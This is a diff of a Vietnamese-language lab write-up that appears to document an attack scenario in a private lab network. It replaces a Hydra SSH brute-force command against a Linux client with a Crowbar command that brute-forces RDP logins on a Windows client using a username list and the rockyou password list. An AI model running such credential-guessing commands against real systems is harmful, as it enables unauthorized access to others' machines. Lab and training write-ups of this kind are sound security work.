@@ -5,14 +5,11 @@
 **Target:** Windows Client (192.168.188.40)  
 
 ## 1. Attack Scenario
-Attacker dùng Hydra từ Kali Linux (192.168.188.20) brute-force SSH vào Linux Client, thử nhiều password từ wordlist rockyou.txt. 
 
-> (Với điều kiện là trên Ubuntu Client phải có OpenSSH. Ta qua máy ubuntu client dùng lệnh `ssh -v` để kiểm tra thử nếu chưa có thì sử dụng `sudo apt install openssh-client` để cài đặt)
-
-**Giả sử attacker đã có được username của Ubuntu_Client**
+Attacker sử dụng Crowbar brute force dịch vụ RDP trên 1 host dưới đây là windows client. Với 1 list common username và list password , sử dựng 1 thread.
 
 ```bash
-sudo hydra -l conmeo -P /usr/share/wordlists/rockyou.txt ssh://192.168.188.50  
+sudo crowbar -b rdp -s 192.168.188.40/32 -U username.txt -C /usr/share/wordlists/rockyou.txt -n 1
 ```
 
 <img width="1602" height="289" alt="image" src="https://github.com/user-attachments/assets/cc284351-0723-476c-9f2c-6f36573abf19" />
